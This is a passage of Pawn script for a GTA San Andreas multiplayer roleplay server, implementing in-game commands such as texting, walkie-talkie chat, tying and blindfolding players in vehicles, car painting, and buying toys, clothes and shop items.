					SendClientMessage(playerid, COLOR_WHITE, "Text message delivered.");
					format(string, sizeof(string), "~r~$-%d", txtcost);
					GameTextForPlayer(playerid, string, 5000, 1);
					GiveZamoraMoney(playerid,-txtcost);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					Mobile[playerid] = INVALID_PLAYER_ID;
					format(string, sizeof(string), "* %s takes out a cellphone and starts to write a message to somebody.", GetName(playerid));
	                SendNearbyMessage(playerid, 4, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					return 1;
				}
			}
		}
	}
    foreach(Player, i)
	{
		new log[128];
  	    if(Player[i][pAdmin] >= 1 && SMSes[i] && i != playerid && i != i)
	    {
	        format(log, sizeof(log), "[BigEar] SMS: %s to %s: %s", GetName(playerid), GetName(i), text);
		    SendClientMessage(i, COLOR_LIGHTSALMON, log);
	    }
	}
	SendClientMessage(playerid, COLOR_GRAD2, "Message wasn't delivered.");
	return 1;
}


IRP:wt(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pWT]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a WalkieTalkie.");
	if(Player[playerid][pWTC] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Your WalkieTalkie is turned off.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /wt [text]");
	if(AntiAdv(playerid, var)) return 1;
	foreach(Player, i)
	{
		if(Player[playerid][pWTC] == Player[i][pWTC])
		{
			format(string, sizeof(string), "** WalkieTalkie %s: %s **", GetName(playerid), var);
			SendClientMessage(i, COLOR_NEWS, string);
		}
	}
	format(string, sizeof(string), "** [WalkieTalkie] %s: %s", GetName(playerid), var);
	SetPlayerChatBubble(playerid,var,COLOR_WHITE,20.0,5000);
	return 1;
}

IRP:wtc(playerid, var[])
{
	new string[128], channel;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pWT]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a WalkieTalkie.");
	if(sscanf(var, "i", channel)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /wtc [channel]");
	Player[playerid][pWTC] = channel;
	if(channel == 0) format(string, sizeof(string), " You have turned your WalkieTalkie off.");
	else format(string, sizeof(string), " You have adjust your WalkieTalkie's channel to %d Hz.", channel);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:blindfold(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pBlindfold]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a blindfold.");
	if(sscanf(var, "u",  user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /blindfold [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be inside a vehicle to blindfold someone.");
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your vehicle.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the vehicle driver.");
	if(!IsPlayerTied(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not tied.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't blindfold yourself.");
	Blindfolded[user] = 1;
	Player[playerid][pBlindfold]--;
	SetPlayerCameraPos(user, -833.5241,-1358.8575,86.9054);
	SetPlayerCameraLookAt(user, -833.5241,-1358.8575,0);
	GameTextForPlayer(user, "~r~Blindfolded", 2500, 3);
	format(string, sizeof(string), "* %s takes out a blindfold and puts it on %s's eyes.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SendClientMessage(playerid, COLOR_WHITE, " Type /unblindfold to remove the blindfold on someone's eyes.");
	return 1;
}

IRP:unblindfold(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "u",  user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /unblindfold [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be inside a vehicle to blindfold someone.");
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your vehicle.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the vehicle driver.");
	if(!Blindfolded[user]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not blindfolded.");
	if(playerid == user && Tied[playerid] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You can't unblindfold yourself while being tied.");
	Blindfolded[user] = 0;
	SetCameraBehindPlayer(user);
	GameTextForPlayer(user, "~G~Unblindfolded", 2500, 3);
	format(string, sizeof(string), "* %s takes out a blindfold and puts it on %s's eyes.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SendClientMessage(playerid, COLOR_WHITE, " Type /unblindfold to remove the blindfold on someone's eyes.");
	return 1;
}

IRP:eject(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "u",  user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /eject [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be inside a vehicle to tie someone.");
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your vehicle.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the vehicle driver.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't  eject yourself.");
	RemovePlayerFromVehicle(user);
	format(string, sizeof(string), "* %s has thrown %s out of the vehicle.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}


IRP:tie(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pRope]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a rope.");
	if(sscanf(var, "u",  user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tie [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be inside a vehicle to tie someone.");
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your vehicle.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the vehicle driver.");
	if(IsPlayerTied(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already tied.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't tie yourself.");
	TogglePlayerTied(user, 1);
	Player[playerid][pRope]--;
	TogglePlayerControllable(user, 0);
	SetCameraBehindPlayer(user);
	GameTextForPlayer(user, "~r~Tied", 2500, 3);
	format(string, sizeof(string), "* %s takes out a rope and ties %s after a strong resistance.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SendClientMessage(playerid, COLOR_WHITE, " Type /untie to untie someone.");
	return 1;
}

IRP:untie(playerid, var[])
{
	new string[128], user;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "u",  user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /untie [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerTied(user)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not tied.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't untie yourself.");
	TogglePlayerTied(user, 0);
	TogglePlayerControllable(user, 1);
	SetCameraBehindPlayer(user);
	GameTextForPlayer(user, "~g~Untied", 2500, 3);
	format(string, sizeof(string), "* %s takes out a knife and cuts the rope around %s.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:colorcar(playerid, var[])
{
	new string[128], col1, col2;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pSpray]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a spraycan.");
	if(sscanf(var, "ii", col1, col2)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /colorcar [color1] [color2]");
	if(col1 < 0 || col1 > 255 || col2 < 0 || col2 > 126) return SendClientMessage(playerid, COLOR_GRAD2, "Colors are between 1 and 255.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be inside a vehicle to color it.");
	ChangeVehicleColor(GetPlayerVehicleID(playerid), col1, col2);
	if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
	{
	    Player[playerid][vC1] = col1;
	    Player[playerid][vC2] = col2;
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
	{
	    Player[playerid][vVC1] = col1;
	    Player[playerid][vVC2] = col2;
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
	{
	    Player[playerid][vVVC1] = col1;
	    Player[playerid][vVVC2] = col2;
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
	{
	    Player[playerid][vVVVC1] = col1;
	    Player[playerid][vVVVC2] = col2;
	}
	Player[playerid][pSpray] --;
	format(string, sizeof(string), "* %s has changed the color of the vehicle he's inside.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:paintcar(playerid, var[])
{
	new string[128], col1;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pSpray]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a spraycan.");
	if(sscanf(var, "ii", col1)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /paintcar [paintjobid]");
	if(col1 < -1 || col1 > 6) return SendClientMessage(playerid, COLOR_GRAD2, "Paintjobs are between 0 and 6.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be inside a vehicle to paint it.");
	ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), col1);
	Player[playerid][pSpray] --;
	format(string, sizeof(string), "* %s has changed the paintjob of the vehicle he's inside.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:getviptoys(playerid, var[])
{
	new option, index, model, string[128];
	if(Player[playerid][pVIP] < 2) return NoAuth(playerid);
    //if(!IsPlayerInRangeOfPoint(playerid, 2, 278.4188,-175.9247,999.6060)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the VIP Toys shop.");
	if(sscanf(var, "ii", option, index))
	{
		ShowPlayerDialog(playerid, 9182, DIALOG_STYLE_MSGBOX, "** [Usage]: /getviptoys [model] [slot (0-9)]", "Hair (1-5) | Laser (6-11) | Headphones (12-15) | Guitar (16)\nTopHat (17) | Motorcycle Helmets (18-22) | Smoke Puff (23) \n\nBronze VIP: Slots 0~3 (4 Slots)\nSilver VIP: Slots 0~5 (6 Slots)\nGold VIP: Slots 0~7 (8 Slots)\nPlatinum VIP: Slots 0~9 (10 Slots)", "Close", "Close");
	    return 1;
	}
	if(option < 1 || option > 85) return SendClientMessage(playerid, COLOR_GRAD2, "Toys are between 1 and 75.");
	if(index < 0 || index > 9) return SendClientMessage(playerid, COLOR_GRAD2, "Slots are between 0 and 9.");
	if(index > 1 && Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 2 slots.");
	if(index > 3 && Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 4 slots.");
	if(index > 5 && Player[playerid][pVIP] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 6 slots.");
	if(index > 7 && Player[playerid][pVIP] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 8 slots.");
	switch(option)
	{
	    case 1 : model = 18640; case 2 : model = 18975; case 3 : model = 19077; case 4 : model = 19136; case 5 : model = 19274;
	    case 6 : model = 18643; case 7 : model = 19080; case 8 : model = 19081; case 9 : model = 19082; case 10: model = 19083;
	    case 11: model = 19084; case 12: model = 19421; case 13: model = 19422; case 14: model = 19423; case 15: model = 19424;
	    case 16: model = 19317; case 17: model = 19352; case 18: model = 18645; case 19: model = 18976; case 20: model = 18977;
		case 21: model = 18978; case 22: model = 18979; case 23: model = 18675;
	}
	if(Player[playerid][pMoney] < 300) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy those toys.");
	Player[playerid][pToyModel][index] = model;
	GiveZamoraMoney(playerid, -300);
	format(string, sizeof(string), "* %s has bought a VIP toy.", GetName(playerid), var);
 	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 	SendClientMessage(playerid, COLOR_WHITE, " You can view and edit your toys using /toys.");
	return 1;
}


IRP:buytoys(playerid, var[])
{
	new option, index, model, idx = GetPlayerVirtualWorld(playerid)-100, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 2 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside a Clothes Shop.");
	if(sscanf(var, "ii", option, index))
	{
		ShowPlayerDialog(playerid, 9182, DIALOG_STYLE_MSGBOX, "** [Usage]: /buytoys [model] [slot (10-19)]", "Glasses (1-30) | Watches (31-45) | Bandanas (46-65) | Hats (66-75)\nMasks (76-85)\n\nRegular Players: Slots 10~11 (2 Slots)\nBronze VIP: Slots 10~13 (4 Slots)\nSilver VIP: Slots 10~15 (6 Slots)\nGold VIP: Slots 10~17 (8 Slots)\nPlatinum VIP: Slots 10~19 (10 Slots)", "Close", "Close");
	    return 1;
	}
	if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
	if(option < 1 || option > 85) return SendClientMessage(playerid, COLOR_GRAD2, "Toys are between 1 and 75.");
	//if(index < 1 || index > 9) return SendClientMessage(playerid, COLOR_GRAD2, "Slots are between 0 and 9.");
	if(index < 10 || index > 19) return SendClientMessage(playerid, COLOR_GRAD2, "Slots are between 10 and 19.");
	if(index > 10 && Player[playerid][pVIP] < 10) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 2 slots.");
	if(index > 13 && Player[playerid][pVIP] < 12) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 4 slots.");
	if(index > 15 && Player[playerid][pVIP] < 13) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 6 slots.");
	if(index > 17 && Player[playerid][pVIP] < 14) return SendClientMessage(playerid, COLOR_GRAD2, "You need to have a higher VIP level to use more than 8 slots.");
	switch(option)
	{
	    case 1 : model = 19006; case 2 : model = 19007; case 3 : model = 19008; case 4 : model = 19009; case 5 : model = 19010; // Glasses
	    case 6 : model = 19011; case 7 : model = 19012; case 8 : model = 19013; case 9 : model = 19014; case 10: model = 19015;
	    case 11: model = 19016; case 12: model = 19017; case 13: model = 19018; case 14: model = 19019; case 15: model = 19020;
	    case 16: model = 19021; case 17: model = 19022; case 18: model = 19023; case 19: model = 19024; case 20: model = 19025;
	    case 21: model = 19026; case 22: model = 19027; case 23: model = 19028; case 24: model = 19029; case 25: model = 19030;
	    case 26: model = 19031; case 27: model = 19032; case 28: model = 19033; case 29: model = 19034; case 30: model = 19035;
	    case 31: model = 19039; case 32: model = 19040; case 33: model = 19041; case 34: model = 19042; case 35: model = 19043; // Watches
	    case 36: model = 19044; case 37: model = 19045; case 38: model = 19046; case 39: model = 19047; case 40: model = 19048;
	    case 41: model = 19049; case 42: model = 19050; case 43: model = 19051; case 44: model = 19052; case 45: model = 19053;
	    case 46: model = 18891; case 47: model = 18892; case 48: model = 18893; case 49: model = 18894; case 50: model = 18895; // Bandanas
	    case 51: model = 18896; case 52: model = 18897; case 53: model = 18898; case 54: model = 18899; case 55: model = 18900;
	    case 56: model = 18901; case 57: model = 18902; case 58: model = 18903; case 59: model = 18904; case 60: model = 18905;
	    case 61: model = 18906; case 62: model = 18907; case 63: model = 18908; case 64: model = 18909; case 65: model = 18910;
	    case 66: model = 18926; case 67: model = 18927; case 68: model = 18928; case 69: model = 18929; case 70: model = 18930; // Hats
	    case 71: model = 18931; case 72: model = 18932; case 73: model = 18933; case 74: model = 18934; case 75: model = 18935;
	    case 76: model = 18911; case 77: model = 18912; case 78: model = 18913; case 79: model = 18914; case 80: model = 18915; // Masks
	    case 81: model = 18916; case 82: model = 18917; case 83: model = 18918; case 84: model = 18919; case 85: model = 18920;
	}
	if(Player[playerid][pMoney] < 300) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy those toys.");
	Player[playerid][pToyModel][index] = model;
	GiveZamoraMoney(playerid, -300);
	format(string, sizeof(string), "* %s has bought a toy for $300.", GetName(playerid), var);
 	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 	SendClientMessage(playerid, COLOR_WHITE, " You can view and edit your toys using /toys.");
	return 1;
}

IRP:toys(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	ShowDialog(playerid, 23);
	return 1;
}

IRP:toylist(playerid, var[])
{
    ShowModelSelectionMenu(playerid, toys, "Toys List");
    return 1;
}
IRP:purchase(playerid, var[])
{
	ShowDialog(playerid, 49);
	return 1;
}
/*IRP:buyclothes(playerid, var[])
{
	new idx = GetPlayerVirtualWorld(playerid)-100;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 2 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside a Clothes Shop.");
	if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
	if(Player[playerid][pMoney] < 1500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy new clothes.");
	ShowModelSelectionMenu(playerid, skinlist, "Buy new clothes", 0x190707BB, 0xE6E6E699, 0xFE2E2EAA);
	return 1;
}*/
IRP:buyclothes(playerid, var[])
{
	new id, string[128];
	if(sscanf(var, "i", id))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buyclothes [skinid]");
	    return 1;
	}
    new idx = GetPlayerVirtualWorld(playerid)-100;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 2 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside a Clothes Shop.");
    if(id < 1 || id > 299) return SendClientMessage(playerid, COLOR_GREY, "Can't choose a skinid from under 1 or above 299.");
    if(BadSkins(playerid,id)) return SendClientMessage(playerid, COLOR_GREY, "The skin you have selected is invalid for your character.");
    if(Player[playerid][pMoney] < 200) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy new clothes.");
    format(string, sizeof(string), "* You've sucessfully changed your clothes and paid $200.");
    GiveZamoraMoney(playerid, -200);
    SendClientMessage(playerid, COLOR_WHITE, string);
    Player[playerid][pModel] = id;
	SetPlayerSkin(playerid, Player[playerid][pModel]);
	return 1;
}

IRP:buy(playerid, var[])
{
	new idx = GetPlayerVirtualWorld(playerid)-100, string[128], type, price;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 && BizInfo[idx][bType] != 2 && BizInfo[idx][bType] != 3 && BizInfo[idx][bType] != 4 && BizInfo[idx][bType] != 6  || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside a business.");
	if(BizInfo[idx][bType] == 1)
	{
		if(sscanf(var, "s[32]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buy [item]");
		if(BizInfo[idx][bProducts] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "This business is currently out of products.");
		if(!strcmp(var, "Cellphone", true))
		{
		    if(Player[playerid][pMoney] < 1500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a cellphone.");
		    if(Player[playerid][pHasCellphone] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already a cellphone.");
		    Player[playerid][pHasCellphone] = 1;
			BizInfo[idx][bMoney] += 1500;
			BizInfo[idx][bProducts] --;
			BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -1500);
			format(string, sizeof(string), "* %s has bought a cellphone for $1500.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "You can choose your number from the cityhall.");
		}
		if(!strcmp(var, "MP3", true))
		{
		    if(Player[playerid][pMoney] < 10000) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a MP3 Player.");
		    if(Player[playerid][pCDPlayer] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already a MP3 Player.");
		    Player[playerid][pCDPlayer] = 1;
			BizInfo[idx][bMoney] += 10000;
			BizInfo[idx][bProducts] --;
			BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -10000);
			format(string, sizeof(string), "* %s has bought a MP3 Player for $10000.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
		if(!strcmp(var, "Mask", true))
		{
			if(Player[playerid][pLevel] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Your level is too low to buy a Mask.");
		    if(Player[playerid][pMoney] < 30000) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a Mask.");
		    if(Player[playerid][pMask] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already a Mask.");
		    Player[playerid][pMask] = 1;
			BizInfo[idx][bMoney] += 30000;
			BizInfo[idx][bProducts] --;
			BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -30000);
			format(string, sizeof(string), "* %s has bought a Mask for $30000.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
		if(!strcmp(var, "Boombox", true))
		{
		    if(Player[playerid][pMoney] < 20000) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a Boombox.");
		    if(Player[playerid][pBoombox] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already a Boombox.");
		    Player[playerid][pBoombox] = 1;
			BizInfo[idx][bMoney] += 20000;
			BizInfo[idx][bProducts] --;
			BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -20000);
			format(string, sizeof(string), "* %s has bought a boombox for $20000.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
		if(!strcmp(var, "Phonebook", true))
		{
		    if(Player[playerid][pMoney] < 500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a phonebook.");
		    if(Player[playerid][pPhonebook] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already a phonebook.");
		    Player[playerid][pPhonebook] = 1;
		    BizInfo[idx][bMoney] += 500;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -500);
			format(string, sizeof(string), "* %s has bought an electronic phonebook for $500.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can find someone's number now. (( /phonebook ))");
		}
		if(!strcmp(var, "Dice", true))
		{
		    if(Player[playerid][pMoney] < 800) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a dice.");
		    if(Player[playerid][pDice] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "You've already a pair of dice.");
		    Player[playerid][pDice] = 1;
		    BizInfo[idx][bMoney] += 800;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -800);
			format(string, sizeof(string), "* %s has bought a pair of special dice for $800.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can roll a dice now. (( /dice ))");
		}
		if(!strcmp(var, "Cigar", true))
		{
		    if(Player[playerid][pMoney] < 250) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a cigar.");
		    if(Player[playerid][pCigar] == 5) return SendClientMessage(playerid, COLOR_GRAD2, "You've already pack of cigars.");
		    Player[playerid][pCigar] = 5;
		    BizInfo[idx][bMoney] += 250;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -250);
			format(string, sizeof(string), "* %s has bought 5 cuban cigars for $250.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can smoke a cigar now. (( /use ))");
		}
		if(!strcmp(var, "Sprunk", true))
		{
	        if(Player[playerid][pMoney] < 500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a sprunk.");
	        if(Player[playerid][pSprunk] == 5) return SendClientMessage(playerid, COLOR_GRAD2, "You've already got box of sprunks.");
		    Player[playerid][pSprunk] = 5;
		    BizInfo[idx][bMoney] += 500;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -500);
			format(string, sizeof(string), "* %s has bought 5 redbull cans for $500.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can drink a sprunk can now. (( /sprunk ))");
		}
		if(!strcmp(var, "Spraycan", true))
		{
	        if(Player[playerid][pMoney] < 550) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a spraycan.");
	        if(Player[playerid][pSpray] == 10) return SendClientMessage(playerid, COLOR_GRAD2, "You've already got spraycans.");
		    Player[playerid][pSpray] = 10;
		    BizInfo[idx][bMoney] += 550;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -550);
			format(string, sizeof(string), "* %s has bought a duko spraycan $550.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can use spraycan to color/paint a car. (( /colorcar & /paintcar ))");
		}
		if(!strcmp(var, "Rope", true))
		{
	        if(Player[playerid][pMoney] < 800) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a rope.");
	        if(Player[playerid][pRope] == 5) return SendClientMessage(playerid, COLOR_GRAD2, "You've already got a package of ropes.");
		    Player[playerid][pRope] = 5;
		    BizInfo[idx][bMoney] += 800;
		    BizInfo[idx][bProducts] --;
		    BizInfo[idx][bSold] ++;
			GiveZamoraMoney(playerid, -800);
			format(string, sizeof(string), "* %s has bought 5 strong ropes for $800.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "* You can tie someone now. (( /tie ))");
		}
		if(!strcmp(var, "Blindfold", true))
		{
	    	if(Player[playerid][pMoney] < 800) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a blindfold.");
	    	if(Player[playerid][pBlindfold] == 5) return SendClientMessage(playerid, COLOR_GRAD2, "You've already got package of blindfolds.");
		    Player[playerid][pBlindfold] = 5;
		    BizInfo[idx][bMoney] += 800;
		    BizInfo[idx][bProducts] --;
